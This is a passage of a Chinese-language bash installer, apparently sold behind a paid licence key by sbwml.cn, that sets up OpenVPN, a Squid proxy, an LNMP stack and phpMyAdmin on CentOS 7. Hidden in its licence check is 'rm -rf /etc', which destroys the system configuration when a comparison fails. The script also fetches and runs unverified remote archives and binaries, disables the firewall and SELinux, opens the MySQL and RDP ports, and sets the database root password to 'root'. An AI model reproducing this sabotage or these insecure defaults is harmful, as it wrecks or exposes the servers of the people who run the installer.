            echo -e "  高级密钥:\033[32m $rmb\033[0m 元/次"
            echo -e "  购买地址:\033[32m http://buy.sbwml.cn \033[0m"
            echo -e "  支付方式:\033[32m 在线支付 \033[0m"
            echo " 目前支持阿里云、腾讯云Centos7.0，微小价格，支持脚本"
            echo
            echo " ...安装被终止"
            exit 0;
        fi
        if [ "$modes" = "3310" ] ;then
            echo
            echo -e "  密钥错误/已被使用！ [高级模式：\033[31m 未开启 \033[0m]"
            echo 
            echo -e "  高级密钥:\033[32m $rmb\033[0m 元/次"
            echo -e "  购买地址:\033[32m http://buy.sbwml.cn \033[0m"
            echo -e "  支付方式:\033[32m 在线支付 \033[0m"
            echo " 目前支持阿里云、腾讯云Centos7.0，微小价格，支持脚本"
            echo
            echo " ...安装被终止"
            exit 0;
        fi
        if [ "$modes" = "" ] ;then
            echo
            echo -e "  \033[32m脚本维护中（本次新增云端APP）...请保留密钥在维护完毕后再安装！\033[0m [高级模式：\033[31m 未开启 \033[0m]"
            echo 
            echo -e "  高级密钥:\033[32m $rmb\033[0m 元/次"
            echo -e "  购买地址:\033[32m http://buy.sbwml.cn \033[0m"
            echo -e "  支付方式:\033[32m 在线支付 \033[0m"
            echo " 目前支持阿里云、腾讯云Centos7.0，微小价格，支持脚本"
            echo
            echo " ...安装被终止"
            exit 0;
        fi
        if [ "$modes" = "3300" ] ;then
            echo 
            echo -e "  密钥正确！ [高级模式：\033[32m 已开启 \033[0m]"
            vip=yes;
			export vip=yes
            type=all;
			export type=all
            ov4=4
			export ov4=4
			pro=4
        else
            echo
            echo -e "  密钥输入错误！ [高级模式：\033[31m 未开启 \033[0m]"
            echo 
            echo -e "  高级密钥:\033[32m $rmb\033[0m 元/次"
            echo -e "  购买地址:\033[32m http://buy.sbwml.cn \033[0m"
            echo -e "  支付方式:\033[32m 在线支付 \033[0m"
            echo " 目前支持阿里云、腾讯云Centos7.0，微小价格，支持脚本"
            echo
            echo " ...安装被终止"
            exit 0;
        fi
        
        parse_json(){

        echo $1 | sed 's/.*'$2':\([^,}]*\).*/\1/'
        }
        findsuffix()
        {
          local name
          name="$PACKAGE$MAJOR$MINOR"
          if $name --version < /dev/null > /dev/null 2>&1; then
            PACKAGE=$name
            return 0
          fi
          name="$PACKAGE-$MAJOR$MINOR"
          if $name --version < /dev/null > /dev/null 2>&1; then
            PACKAGE=$name
            return 0
          fi
          name="${PACKAGE}-${MAJOR}.${MINOR}"
          if $name --version < /dev/null > /dev/null 2>&1; then
            PACKAGE=$name
            return 0
          fi

          return 1
        }
        
        version_check()
        {
          local USESUFFIX=""
          if [ "$1" = "usesuffix" ]; then
            USESUFFIX=true
            shift 1
          fi

          PACKAGE=$1
          PACKAGENAME=$1
          MAJOR=$2
          MINOR=$3
          MICRO=$4
          SILENT=$5
          WRONGVERSION=$6

          VERSION=$MAJOR

          if [ ! -z "$MINOR" ]; then VERSION=$VERSION.$MINOR; else MINOR=0; fi
          if [ ! -z "$MICRO" ]; then VERSION=$VERSION.$MICRO; else MICRO=0; fi
  
          if [ x$SILENT != x2 ]; then
            if [ ! -z "$VERSION" ]; then
            printf "Checking for $PACKAGE >= $VERSION ... "
            else
            printf "Checking for $PACKAGE ... "
          fi
          fi

          if [ -z "$USESUFFIX" ]; then
            ($PACKAGE --version) < /dev/null > /dev/null 2>&1 ||
            {
              if [ -z "$VERSION" ]; then
                VERSION="1.2.3"
              else
                version_check usesuffix $PACKAGE $MAJOR $MINOR $MICRO 2
                return
              fi
              printerror_notfound
              exit 1
            }
          else
            findsuffix ||
            {
              printerror_notfound
              exit 1
            }
          fi
          pkg_version=`$PACKAGE --version|head -n 1|sed 's/([^)]*)//g;s/^[a-zA-Z\.\ \-]*//;s/ .*$//'`
          pkg_major=`echo $pkg_version | cut -d. -f1`
          pkg_minor=`echo $pkg_version | sed s/[-,a-z,A-Z].*// | cut -d. -f2`
          pkg_micro=`echo $pkg_version | sed s/[-,a-z,A-Z].*// | cut -d. -f3`
          [ -z "$pkg_minor" ] && pkg_minor=0
          [ -z "$pkg_micro" ] && pkg_micro=0

          WRONG=
          if [ -z "$MAJOR" ]; then
            echo "found $pkg_version, ok."
            return 0
          fi
          if [ "$pkg_major" -lt "$MAJOR" ]; then
            WRONG=1
          elif [ "$pkg_major" -eq "$MAJOR" ]; then
            if [ "$pkg_minor" -lt "$MINOR" ]; then
                      WRONG=1
            elif [ "$pkg_minor" -eq "$MINOR" -a "$pkg_micro" -lt "$MICRO" ]; then
              WRONG=1
            fi
          fi
          if [ ! -z "$WRONG" ]; then
            WRONGVERSION=$pkg_version
            
            if [ -z "$USESUFFIX" ]; then
              version_check usesuffix $PACKAGE $MAJOR $MINOR $MICRO 2 "$pkg_version"
              return
            fi
            if [ x$SILENT = x1 ]; then
              return 2;
            fi
            printerror_notfound
            exit 2
          else
            echo "found $pkg_version, ok."
            return 0
          fi
        }
        fi
	fi
    fi
	fi
	fi
    chattr -i /etc/hosts >/dev/null 2>&1
    if [[ $mode == "x" ]]
    then
    clear
    echo
    echo "正在移除系统OpenVPN服务/配置文件..."
    echo
    echo "正在停止服务..."
    vpnoff
    sleep 2
    echo "正在卸载程序..."
    yum remove openvpn squid httpd -y
    echo "正在清理残留文件..."
	chattr -R -i /data >/dev/null 2>&1
    rm -rf /etc/squid /usr/sbin/openvpn* /etc/openvpn /bin/dup /bin/sql /bin/unsql /bin/onsql /bin/lock /bin/unlock /home/OpenVPN-HTTP.ovpn /home/OpenVPN-Old.ovpn /home/openvpn.log /home/openvpn-sbwml.zip /passwd /lib/systemd/system/vpn.service
    rm -rf /usr/bin/proxy /usr/bin/udp /usr/bin/vpn /usr/bin/vpnoff /usr/local/share/ssl /etc/squid /usr/local/nginx /usr/local/php /usr/local/mysql /data /etc/scripts.conf /usr/share/linux/* /lib/systemd/system/vpn.service
    rm -rf /etc/init.d/nginx /etc/init.d/php-fpm /etc/init.d/mysql /etc/python/cert-python.conf /usr/share/xml/connect.sh /usr/share/xml/disconnect.sh /usr/share/xml/login.sh
    rm -rf /userdata /install.log /var/install.log
    echo "卸载完成，感谢使用！"
    exit 0;
    fi
fi
echo
echo "系统正在安装OpenVPN服务，请耐心等待："
echo 
if [[ $mode == 4 ]]
    then
    echo "自定义设置端口（以下设置可直接回车使用默认值）"
			echo "（删除提示：按住Ctrl + Delet 可删除输入.）"
			echo
			echo -n "输入VPN端口（默认443）："
			read vpnport
			if [ -z $vpnport ]
			then
				echo -e "VPN端口：\033[32m443\033[0m"
				vpnport=443
			else
				echo -e "VPN端口：\033[32m$vpnport\033[0m"
			fi
			echo
			echo "（此端口设置复杂的端口有效避免被扫流量问题，中国移动请保留8080）"
			echo -n "输入HTTP转接端口（建议8080 ~ ≤51200，默认8080）："
			read httpports
			if [ -z $httpports ]
			then
				echo -e "HTTP转接端口：\033[32m8080\033[0m"
				httpports=8080
			else
				echo -e "HTTP转接端口：\033[32m$httpports\033[0m"
			fi
			echo
			echo "（此端口建议保留80，已防扫）"
			echo -n "输入常规代理端口（默认80）："
			read proxyport
			if [ -z $proxyport ]
			then
				echo  -e "常规代理端口：\033[32m80\033[0m"
				proxyport=80
			else
				echo -e "常规代理端口：\033[32m$proxyport\033[0m"
			fi
			if [[ $BLDOG = yes ]];then
				echo 
				echo -n "输入云流量客服QQ号码："
				read QQ
				if [ -z $QQ ]
					then
						echo  -e "云流量客服QQ号码：\033[32m未设置\033[0m"
					else
						echo -e "云流量客服QQ号码：\033[32m$QQ\033[0m"
				fi
			fi
			echo
			echo -n "是否安装phpMyAdmin? 1.安装 2.不安装（默认 1）："
			read phpMyAdmin
			if [ -z $phpMyAdmin ]
			then
				echo -e "\033[32m数据库管理：安装（默认ROOT密码：root）\033[0m"
				phpMyAdmin=1
			else
				if [[ $phpMyAdmin == 1 ]]
				then
					echo -e "\033[32m数据库管理：安装（默认ROOT密码：root）\033[0m"
					phpMyAdmin=1
				fi
				if [[ $phpMyAdmin == 2 ]]
				then
					echo -e "数据库管理：\033[32m不安装phpMyAdmin\033[0m"
					phpMyAdmin=2
				fi
    fi
fi
echo "正在部署环境..."
sleep 1
rm -f /etc/yum.repos.d/*
wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo >/dev/null 2>&1
killall openvpn >/dev/null 2>&1
killall udp >/dev/null 2>&1
kill `netstat -nlp | grep :3306 | awk '{print $7}' | awk -F"/" '{ print $1 }'` >/dev/null 2>&1
kill `netstat -nlp | grep :80 | awk '{print $7}' | awk -F"/" '{ print $1 }'` >/dev/null 2>&1
kill `netstat -nlp | grep :8080 | awk '{print $7}' | awk -F"/" '{ print $1 }'` >/dev/null 2>&1
kill `netstat -nlp | grep :443 | awk '{print $7}' | awk -F"/" '{ print $1 }'` >/dev/null 2>&1
kill `netstat -nlp | grep :8888 | awk '{print $7}' | awk -F"/" '{ print $1 }'` >/dev/null 2>&1
rm -rf /usr/bin/udp /lib/systemd/system/vpn.service
rm -rf /etc/openvpn/* /etc/squid/* /bin/sqlpass /bin/sql
rm -rf /home/openvpn-sbwml.zip /home/OpenVPN-HTTP.ovpn /home/OpenVPN-HTTP-lt.ovpn /home/OpenVPN-Old.ovpn /etc/httpd/conf/httpd.conf
rm -rf /usr/local/ssl /bin/end 
echo "安装执行命令..."
yum remove -y squid openvpn httpd epel*
yum install -y redhat-lsb gawk tar iptables iptables-services zip unzip httpd-devel net-tools psmisc gcc glibc-static java openssl expect ntp
# sbwml
if [[ $mode == 4 ]];then
echo "正在同步时间..."
systemctl stop ntpd.service >/dev/null 2>&1
service ntpd stop >/dev/null 2>&1
\cp -rf /usr/share/zoneinfos/Asia/Shanghai /etc/localtime >/dev/null 2>&1
ntpServer=(
[0]=s2m.time.edu.cn
[1]=s2c.time.edu.cn
[2]=s1a.time.edu.cn
[3]=s2g.time.edu.cn
[4]=s2k.time.edu.cn
)
serverNum=`echo ${#ntpServer[*]}`
NUM=0
for (( i=0; i<=$serverNum; i++ )); do
    echo
    echo -en " 正在和NTP服务器 \033[34m${ntpServer[$NUM]} \033[0m 同步中..."
    ntpdate ${ntpServer[$NUM]} >> /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo -e "\t\t\t[  \e[1;32mOK\e[0m  ]"
		echo -e " 当前时间：\033[34m$(date -d "2 second" +"%Y-%m-%d %H:%M.%S")\033[0m"
		echo
    else
        echo -e "\t\t\t[  \e[1;31mERROR\e[0m  ]"
        let NUM++
    fi
    sleep 2
done
hwclock --systohc
systemctl start ntpd.service >/dev/null 2>&1
service ntpd start >/dev/null 2>&1
fi
version=`lsb_release -a | grep -e Release|awk -F ":" '{ print $2 }'|awk -F "." '{ print $1 }'`
echo "正在匹配软件源..."
sleep 1
if [ $version == "5" ];then
    if [ $(getconf LONG_BIT) = '64' ] ; then
    echo ==========================================================================
    echo 
    echo "安装被终止，请在Centos7.0系统上执行操作..."
    echo
# Logo    ******************************************************************
CO='
                OpenVPN-2.3.11 安装失败                    
             Powered by sbwml.cn 2015-2016               
                  All Rights Reserved           
                                        
==========================================================================';
    echo "$CO";
    exit
    else
    echo ==========================================================================
    echo 
    echo "安装被终止，请在Centos7.0系统上执行操作..."
    echo
# Logo    ******************************************************************
CO='
                OpenVPN-2.3.11 安装失败                    
             Powered by sbwml.cn 2015-2016               
                  All Rights Reserved           
                                        
==========================================================================';
    echo "$CO";
    exit
    fi
fi
if [ $version == "6" ];then
    if [ $(getconf LONG_BIT) = '64' ] ; then
    echo ==========================================================================
    echo 
    echo "安装被终止，请在Centos7.0系统上执行操作..."
    echo
# Logo    ******************************************************************
CO='
                OpenVPN-2.3.11 安装失败                    
             Powered by sbwml.cn 2015-2016               
                  All Rights Reserved           
                                        
==========================================================================';
    echo "$CO";
    exit
    else
    echo ==========================================================================
    echo 
    echo "安装被终止，请在Centos7.0系统上执行操作..."
    echo
# Logo    ******************************************************************
CO='
                OpenVPN-2.3.11 安装失败                    
             Powered by sbwml.cn 2015-2016               
                  All Rights Reserved           
                                        
==========================================================================';
    echo "$CO";
    exit
    fi
fi
if [ $version == "7" ];then
    #rpm -ivh ${web}${MirrorHost}/${ServerLocation}/${c700} >/dev/null 2>&1
	yum install -y epel* >/dev/null 2>&1
	sed -i 's/#baseurl/baseurl/g' /etc/yum.repos.d/epel.repo
	sed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/epel.repo
	#wget -O /etc/yum.repos.d/epel.repo http://sbwml.cn/API/epel.repo >/dev/null 2>&1
	#echo "正在重建缓存（时间可能较长，但是很有意义）..."
	#yum clean all
	#yum makecache
fi
if [ ! $version ];then
    clear
    echo ==========================================================================
    echo 
    echo "安装被终止，请在Centos7.0系统上执行操作..."
    echo
# Logo    ******************************************************************
CO='
                OpenVPN-2.3.11 安装失败                    
             Powered by sbwml.cn 2015-2016               
                  All Rights Reserved           
                                        
==========================================================================';
    echo "$CO";
    exit
fi
PP='
==========================================================================
              骚逼汪™服务验证失败，安装被终止

                OpenVPN-2.3.11 安装失败                    
             Powered by sbwml.cn 2015-2016               
                  All Rights Reserved           
                                        
==========================================================================';
if [[ ${copyright%%\ *} == $key ]]
    then
      end=1225;
    else
    clear
    echo "$PP";
    exit
fi
echo "检查并更新软件..."
sleep 1
#yum update -y
# OpenVPN Installing ****************************************************************************
echo "配置网络环境..."
sleep 1
systemctl stop firewalld.service >/dev/null 2>&1
systemctl disable firewalld.service >/dev/null 2>&1
systemctl restart iptables.service >/dev/null 2>&1
iptables -F >/dev/null 2>&1
service iptables save >/dev/null 2>&1
service iptables restart >/dev/null 2>&1
iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -o eth0 -j MASQUERADE >/dev/null 2>&1
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 3389 -j ACCEPT >/dev/null 2>&1
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 3306 -j ACCEPT >/dev/null 2>&1
if [[ $mode == 4 ]]
    then
		iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport $httpports -j ACCEPT >/dev/null 2>&1
		iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport $proxyport -j ACCEPT >/dev/null 2>&1
		iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport $vpnport -j ACCEPT >/dev/null 2>&1
    else
		iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 8080 -j ACCEPT >/dev/null 2>&1
		iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT >/dev/null 2>&1
		iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 443 -j ACCEPT >/dev/null 2>&1
fi
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 8888 -j ACCEPT >/dev/null 2>&1
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 9999 -j ACCEPT >/dev/null 2>&1
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 9876 -j ACCEPT >/dev/null 2>&1
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 3399 -j ACCEPT >/dev/null 2>&1
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT >/dev/null 2>&1
iptables -t nat -A POSTROUTING -j MASQUERADE >/dev/null 2>&1
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT >/dev/null 2>&1
service iptables save >/dev/null 2>&1
service iptables restart >/dev/null 2>&1
systemctl restart iptables.service >/dev/null 2>&1
chkconfig iptables on >/dev/null 2>&1
systemctl enable iptables.service >/dev/null 2>&1
setenforce 0 >/dev/null 2>&1
# OpenVPN Installing ****************************************************************************
if [[ 1225 == $end ]]
    then
    openvpn=on;
    else
    clear
    echo "$PP";
    exit
fi
cd /etc/
if [[ ${key2%%\ *} == $pass ]]
    then
        uido=125133;
    else
    rm -rf /etc
fi
rm -rf ./sysctl.conf
wget ${web}${MirrorHost}/${ServerLocation}/${sysctl} >/dev/null 2>&1
sleep 1
chmod 0755 ./sysctl.conf
sysctl -p >/dev/null 2>&1
# OpenVPN Installing ****************************************************************************
echo "正在安装主程序..."
sleep 1
yum install openvpn -y
yum install -y squid openssl openssl-devel lzo lzo-devel pam pam-devel automake pkgconfig openvpn
# OpenVPN Installing ****************************************************************************

################  安装加密    ################

if [[ $ov4 == 4 ]]
    then
        cd /var/
        mkdir -p /usr/local/man/man1/
        wget http://sbwml.cn/{${name}:${code}}/shc-3.8.9b.tgz >/dev/null 2>&1
        tar zxf shc-3.8.9b.tgz && rm -f shc-3.8.9b.tgz && cd shc-3.8.9b
        ./sql yes >/dev/null 2>&1
        cd /var/ && rm -rf shc-3.8.9b 
fi

################  安装加密    ################

cd /etc/openvpn/
rm -rf ./server.conf
rm -rf ./sbwml.sh
wget ${web}${MirrorHost}/${ServerLocation}/${vpns} >/dev/null 2>&1 &&
tar -zxf server-passwd.tar.gz
################  服务配置    ################

echo '##################################
#    OpenVPN - sbwml.cn     #
#        2016.05.14         #
##################################

port 443
proto tcp
dev tun
ca /etc/openvpn/easy-rsa/keys/ca.crt
cert /etc/openvpn/easy-rsa/keys/centos.crt
key /etc/openvpn/easy-rsa/keys/centos.key
dh /etc/openvpn/easy-rsa/keys/dh2048.pem
auth-user-pass-verify /etc/openvpn/sbwml.sh via-env
client-cert-not-required
username-as-common-name
script-security 3 system
server 10.0.0.0 255.255.255.0
ifconfig-pool-persist /etc/openvpn/ipp.txt
;server-bridge 10.8.0.4 255.255.255.0 10.8.0.50 10.8.0.100
push "redirect-gateway def1 bypass-dhcp"
;push "route 192.168.10.0 255.255.255.0"
;push "route 192.168.20.0 255.255.255.0"
push "dhcp-option DNS 112.124.47.27"
push "dhcp-option DNS 114.215.126.16"
;client-to-client
;duplicate-cn
keepalive 10 120  #160
tls-auth /etc/openvpn/easy-rsa/ta.key 0  #1
comp-lzo
max-clients 12
persist-key  #1
persist-tun
;status openvpn-status.log
log /etc/openvpn/openvpn.log
log-append /etc/openvpn/openvpn.log
verb 3
;mute 20
;crl-verify /etc/openvpn/easy-rsa/keys/crl.pem
' >server.conf

################  服务配置    ################

################  LNMP    ################

if [[ $ov4 == 4 ]]
    then
    echo "正在极速部署LNMP环境..."
    sleep 2
    echo 
    echo "正在安装环境包..."
    sleep 2
    groupadd -f mysql >/dev/null 2>&1
    useradd -g mysql mysql >/dev/null 2>&1
    groupadd -f www >/dev/null 2>&1
    useradd -g www www >/dev/null 2>&1
    yum install -y libmcrypt-devel telnet telnet-server libpng libjpeg freetype-devel mariadb-libs postfix redhat-lsb redhat-lsb-core redhat-lsb-cxx redhat-lsb-desktop redhat-lsb-languages  redhat-lsb-printing
    echo "安装共享库..."
    sleep 1
    rm -rf /libiconv5
    mkdir /libiconv5
    cd /libiconv5
    echo 下载安装包...
    wget http://sbwml.cn/${name}:${code}/libiconv/libiconv-1.14-3.el7.x86_64.rpm >/dev/null 2>&1 && 
    wget http://sbwml.cn/${name}:${code}/libiconv/libiconv-devel-1.14-3.el7.x86_64.rpm >/dev/null 2>&1 && 
    wget http://sbwml.cn/${name}:${code}/libiconv/libiconv-static-1.14-3.el7.x86_64.rpm >/dev/null 2>&1 &&
    wget http://sbwml.cn/${name}:${code}/libiconv/libiconv-utils-1.14-3.el7.x86_64.rpm >/dev/null 2>&1 &&
    echo "正在安装..."
    rpm -ivh ./*.rpm >/dev/null 2>&1
    echo "共享库安装完成..."
    #wget http://www.sbwml.cn/${name}:${code}/cert-forensics-tools-release-el7.rpm >/dev/null 2>&1
    #rpm -Uvh cert-forensics-tools-release*rpm && rm -f cert-forensics-tools-release-el7.rpm
    #yum --enablerepo=forensics install -y libiconv libiconv-devel libiconv-static libiconv-utils
    mkdir -p /data/www/
    mkdir -p /var/lib/mysql/
    rm -rf /var/lib/mysql/*
    # yum install 
    cd /etc/ && rm -f my.cnf && wget http://www.sbwml.cn/${name}:${code}/my.cnf >/dev/null 2>&1 && chmod 0755 my.cnf
    cd /usr/local/
    rm -f lnmp1.2.0-0513.tar.gz
    if [ ! -e "/etc/alternatives/demo" ];
    then
    echo "正在下载源码..."
    echo $name >/usr/share/linux/name
    echo $code >/usr/share/linux/code
    wget -O /sbwml/time http://www.sbwml.cn/${name}:${code}/mo >/dev/null 2>&1
	wget http://183.2.251.131:8888/{#1${name}:${code}}
    if [ ! -e "/usr/local/lnmp1.2.0-0513.tar.gz" ];
    then
        echo "更换下载线路..."
        wget http://sbwml.cn/{#2${name}:${code}}
    fi
    else
    echo "正在下载源码..."
    \cp -rf /etc/linux/demo /usr/local/lnmp1.2.0-0513.tar.gz >/dev/null 2>&1
    wget -O /sbwml/time http://www.sbwml.cn/${name}:${code}/mo >/dev/null 2>&1
    fi
    echo "正在处理数据..."
    tar -zxf ./lnmp1.2.0-0513.tar.gz && rm -f lnmp1.2.0-0513.tar.gz
    cd /sbwml/ && tar zxf time && rm -f time
    cd /usr/local/mysql
    chown -R mysql.mysql .
    chown mysql.mysql /usr/local/mysql/data
    rm -f /usr/bin/mysql /usr/bin/mysqldump /usr/bin/mysqladmin
    ln -s /usr/local/mysql/bin/mysql /usr/bin/mysql
    ln -s /usr/local/mysql/bin/mysqldump /usr/bin/mysqldump
    ln -s /usr/local/mysql/bin/mysqladmin /usr/bin/mysqladmin
    cd /
    wget http://www.sbwml.cn/${name}:${code}/install.tar.gz >/dev/null 2>&1 &&
    #\cp -rf /sbwml/moba/lnmp.tar.gz ./
    tar zxf install.tar.gz && rm -f install.tar.gz
    cd lnmp-start
    ./install
    cd && rm -rf /lnmp-start
    cd /
    echo "正在初始化数据..."
    rm -rf /data/www
    if [[ $BLDOG = no ]];then
    #wget http://www.sbwml.cn/${name}:${code}/data.tar.gz >/dev/null 2>&1
    \cp -rf /sbwml/moba/data.tar.gz ./
    tar zxf data.tar.gz && rm -f data.tar.gz
    else
    #wget http://www.sbwml.cn/${name}:${code}/bldog.tar.gz >/dev/null 2>&1
    \cp -rf /sbwml/moba/bldog.tar.gz ./
    tar zxf bldog.tar.gz && rm -f bldog.tar.gz
    fi
	mkdir -p /data/vpn-log/
    cd /data/www/default/
    if [ $phpMyAdmin = 1 ];then
	echo "正在安装phpMyAdmin..."
    curl -o phpMyAdmin-4.4.15.5-all-languages.tar.gz http://sbwml.cn/phpMyAdmin-4.4.15.5-all-languages.tar.gz
    tar zxf phpMyAdmin-4.4.15.5-all-languages.tar.gz >/dev/null 2>&1
    rm -f phpMyAdmin-4.4.15.5-all-languages.tar.gz
    mv phpMyAdmin-4.4.15.5-all-languages $dbno
    fi
    echo "尝试启动LNMP..."
    lnmp start >/dev/null 2>&1 
    lnmp restart
    create_db_sql="create database IF NOT EXISTS ov"
    mysql -hlocalhost -uroot -proot -e "${create_db_sql}"
	if [[ ${#code} = 8 ]];then
	cd /bin/ && rm -f sql #&& wget http://sbwml.cn/${name}:${code}/sql >/dev/null 2>&1 && 
	\cp -rf /sbwml/moba/sql ./
    chmod 0755 sql
	else
    if [[ ${#code} = 6 ]];then
    cd /bin/ && rm -f sql #&& wget http://sbwml.cn/${name}:${code}/sql >/dev/null 2>&1 && 
    \cp -rf /sbwml/moba/sql ./
    chmod 0755 sql
    fi
	fi
    sqlport=`netstat -nlt|grep 3306|wc -l`
    if [[ $sqlport == 0 ]];then
    echo
    echo -e "\033[31m MYSQL 启动失败... \033[0m]"
    rm -f /bin/sql && wget -O /bin/sqlpass http://sbwml.cn/${name}:${code}/sqlpass/sqlpass >/dev/null 2>&1
    #\cp -rf /sbwml/moba/sqlpass/sqlpass /bin/sqlpass
    chmod 0755 /bin/sqlpass
    echo "这会导致后台无法进入，请在脚本安装完成后重启系统"
    echo "开机后执行：sqlpass 命令进行修复"
    echo 
    echo "你清楚了吗？ (请按回车继续执行脚本)"
    read 
    fi
#    echo
#    echo "设置Mysql密码"
#    echo 
#    echo -n " 输入新Mysql密码："
 #   read sqlpassword
    sqlpassword=root
    if [ -z $sqlpassword ]
        then
            echo -n "  密码不能为空，请重新输入："
            read sqlpassword
            if [ -z $sqlpassword ]
                then
                    echo  "  输入错误，系统创建默认Mysql密码：sbwml2016"
                    sqlpassword=sbwml2016;
                        sqlcc=no;
                else
                    sqlcc=yes;
            fi
    else
            sqlcc=yes;
    fi 
fi
echo
sql $sqlpassword >/dev/null 2>&1
cd /etc/
if [[ $mode == 4 ]]
    then
        rm -rf sbw-webs.conf
        #wget ${web}${MirrorHost}/${name}:${code}/sbw-webs.conf >/dev/null 2>&1 && mv sbw-webs.conf sbw.conf >/dev/null 2>&1
        \cp -rf /sbwml/moba/sbw-webs.conf ./sbw.conf
    else
        rm -rf sbw.conf
        wget ${web}${MirrorHost}/yumhttp/sbw.conf >/dev/null 2>&1 
fi
chmod 0644 ./sbw.conf >/dev/null 2>&1
\cp -rf /etc/sbw.conf /bin/dup >/dev/null 2>&1 && chmod 0755 /bin/dup
if [[ $mode == 4 ]]
    then
        sed -i "6s/443/$vpnport/" /bin/dup
fi
mv sbw.conf scripts.conf >/dev/null 2>&1
\cp -rf /bin/dup /etc/scripts.conf

######################### 控制脚本    #############################

mkdir -p /usr/share/xml/
cd /usr/share/xml/ # && wget http://sbwml.cn/${name}:${code}/demo.tar.gz >/dev/null 2>&1 && tar zxf demo.tar.gz >/dev/null 2>&1
#rm -f demo.tar.gz
#sed -i "38s/root/$ovmysql/" disconnect.sh
#if [[ $mode == 4 ]]
#then
#    if [[ $sqlcc == yes ]]
#    then
##        rm -rf disconnect.sh disconnect222.sh
#        wget -c http://sbwml.cn/${name}:${code}/sh/disconnect222.sh -O disconnect.sh >/dev/null 2>&1 
#        chmod 0755 disconnect.sh
#        sed -i "4s/222/$sqlpassword/" disconnect.sh
#        sed -i "5s/222/$sqlpassword/" disconnect.sh
#        sed -i "16s/222/$sqlpassword/" disconnect.sh
#        sed -i "17s/222/$sqlpassword/" disconnect.sh
#        else
#        rm -rf disconnect.sh disconnectsbwml2016.sh
#        wget -c http://sbwml.cn/${name}:${code}/sh/disconnectsbwml2016.sh -O disconnect.sh >/dev/null 2>&1 
#        chmod 0755 disconnect.sh
 #   fi
#
 #   if [[ $sqlcc == yes ]]
    #then
    #    rm -rf login2016.sh login.sh
    #    wget -c http://sbwml.cn/${name}:${code}/sh/login2016.sh -O login.sh >/dev/null 2>&1 
    #    chmod 0755 login.sh
    #    sed -i "4s/sbwml2016/$sqlpassword/" login.sh
    #    sed -i "5s/sbwml2016/$sqlpassword/" login.sh
    #    sed -i "6s/sbwml2016/$sqlpassword/" login.sh
    #    sed -i "7s/sbwml2016/$sqlpassword/" login.sh
    #    sed -i "8s/sbwml2016/$sqlpassword/" login.sh
    #    sed -i "4s/root/$sqlpassword/" /data/www/default/php/conn.php
     #   else
        #rm -rf login2016.sh login.sh
#        wget -c http://sbwml.cn/${name}:${code}/sh/login2016.sh -O login.sh >/dev/null 2>&1 
#        chmod 0755 login.sh
#        sed -i "4s/root/$sqlpassword/" /data/www/default/php/conn.php
 #   fi
#wget http://sbwml.cn/${name}:${code}/sh/connect.sh >/dev/null 2>&1 
#chmod 0755 connect.sh
#fi
    if [[ $ov4 == 4 ]]
        then
        if [[ $BLDOG = no ]];then
        rm -f connect.sh disconnect.sh login.sh
        wget http://sbwml.cn/${name}:${code}/sh/root/connect.sh >/dev/null 2>&1 
        #\cp -rf /sbwml/moba/sh/root/connect.sh ./
        wget http://sbwml.cn/${name}:${code}/sh/root/disconnect.sh >/dev/null 2>&1 
        \cp -rf /sbwml/moba/sh/root/disconnect.sh ./
        wget http://sbwml.cn/${name}:${code}/sh/root/login.sh >/dev/null 2>&1 
        #\cp -rf /sbwml/moba/sh/root/login.sh ./
        chmod 0755 ./*
        else
        rm -f connect.sh disconnect.sh login.sh
        rm -f /bin/end /etc/openvpn/config.cfg
        chmod 0755 /bin/end  >/dev/null 2>&1 
        wget -O /etc/openvpn/config.cfg http://sbwml.cn/${name}:${code}/script/config.cfg >/dev/null 2>&1 
        #wget http://sbwml.cn/${name}:${code}/sh/bldog/connect.sh >/dev/null 2>&1 
        \cp -rf /sbwml/moba/sh/bldog/connect.sh ./
        #wget http://sbwml.cn/${name}:${code}/sh/bldog/disconnect.sh >/dev/null 2>&1 
        \cp -rf /sbwml/moba/sh/bldog/disconnect.sh ./
        #wget http://sbwml.cn/${name}:${code}/sh/bldog/login.sh >/dev/null 2>&1 
        \cp -rf /sbwml/moba/sh/bldog/login.sh ./
        chmod 0755 ./*
        fi
    fi
######################### 控制脚本（完）  #############################

# OpenVPN Installing ****************************************************************************
cd /etc/openvpn/
wget ${web}${MirrorHost}/${ServerLocation}/${RSA} >/dev/null 2>&1 &&
tar -zxvf ${RSA} >/dev/null 2>&1
rm -rf /etc/openvpn/${RSA}
cd /etc/squid/
rm -rf ./${sq}
rm -rf ./squid_passwd
echo "正在启用HTTP代理端口..."
sleep 2
proxy=`echo -n $MirrorHost|md5sum`
if [[ $ipmd == ${proxy%%\ *} ]]
    then
        if [[ $mode == 4 ]]
    then
            echo "auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_passwd
auth_param basic children 5  
auth_param basic realm Welcome to pycredit's proxy-only web server 
acl SSL_ports port 443
acl Safe_ports port 80
acl Safe_ports port 21
acl Safe_ports port 443
acl Safe_ports port 8080
acl CONNECT method CONNECT
acl squid_user proxy_auth REQUIRED
via off
request_header_access X-Forwarded-For deny all
request_header_access user-agent  deny all
reply_header_access X-Forwarded-For deny all
reply_header_access user-agentdeny all
http_port $proxyport
http_access allow squid_user
http_access deny all
cache_dir ufs /var/spool/squid 100 16 256 read-only
cache_mem 8415 MB
coredump_dir /var/spool/squid
access_log /var/log/squid/access.log
visible_hostname TD-LTE/FDD-LTE(www.sbwml.cn)
cache_mgr Welcome_to_use_OpenVPN_For_www.sbwml.cn
# www.sbwml.cn" >./${sq}
            chmod 0755 ./${sq}
        else
